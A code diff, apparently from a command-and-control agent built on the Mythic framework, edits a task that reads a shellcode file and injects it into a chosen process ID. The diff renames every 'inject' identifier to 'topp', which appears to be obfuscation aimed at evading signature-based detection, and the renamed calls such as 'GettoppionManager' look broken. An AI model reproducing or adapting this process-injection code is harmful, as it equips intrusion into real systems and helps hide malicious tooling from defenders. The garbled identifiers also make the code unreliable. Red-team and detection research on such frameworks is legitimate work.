@@ -1,10 +1,10 @@
 ﻿#define COMMAND_NAME_UPPER
 
 #if DEBUG
-#define SHINJECT
+#define SHtopp
 #endif
 
-#if SHINJECT
+#if SHtopp
 
 using Interop.Classes;
 using Interop.Interfaces;
@@ -14,17 +14,17 @@ using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class shinject : Tasking
+    public class shtopp : Tasking
     {
         [DataContract]
-        internal struct ShinjectArguments
+        internal struct ShtoppArguments
         {
             [DataMember(Name = "pid")]
             public int PID;
             [DataMember(Name = "shellcode-file-id")]
             public string Shellcode;
         }
-        public shinject(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public shtopp(IAgent agent, Interop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
@@ -32,7 +32,7 @@ namespace Tasks
         public override void Start()
         {
             MythicTaskResponse resp;
-            ShinjectArguments args = _jsonSerializer.Deserialize<ShinjectArguments>(_data.Parameters);
+            ShtoppArguments args = _jsonSerializer.Deserialize<ShtoppArguments>(_data.Parameters);
             System.Diagnostics.Process proc = null;
             try
             {
@@ -49,14 +49,14 @@ namespace Tasks
                         _data.ID,
                         args.Shellcode, out byte[] code))
                 {
-                    var technique = _agent.GetInjectionManager().CreateInstance(code, args.PID);
+                    var technique = _agent.GettoppionManager().CreateInstance(code, args.PID);
                     if (technique.topp())
                     {
                         resp = CreateTaskResponse(
                             $"topped code into {proc.ProcessName} ({proc.Id})", true, "completed",
                             new IMythicMessage[]
                             {
-                                Artifact.ProcessInject(proc.Id, technique.GetType().Name)
+                                Artifact.Processtopp(proc.Id, technique.GetType().Name)
                             });
                     }
                     else
